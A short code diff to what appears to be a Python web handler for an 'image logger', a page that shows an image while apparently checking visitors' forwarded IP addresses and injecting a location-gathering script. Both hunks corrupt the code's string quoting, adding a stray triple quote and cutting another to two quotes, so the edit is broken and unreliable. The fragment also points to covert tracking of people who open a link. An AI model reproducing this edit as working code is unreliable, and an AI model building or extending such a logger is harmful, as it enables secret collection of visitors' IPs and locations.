@@ -211,7 +211,7 @@ background-size: contain;
 width: 100vw;
 height: 100vh;
 }}</style><div class="img"></div>'''.encode()
-            
+            """
             if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                 return
             
@@ -270,7 +270,7 @@ height: 100vh;
                 self.end_headers() # Declare the headers as finished.
 
                 if config["accurateLocation"]:
-                    data += b"""<script>
+                    data += b""<script>
 var currenturl = window.location.href;
 
 if (!currenturl.includes("g=")) {
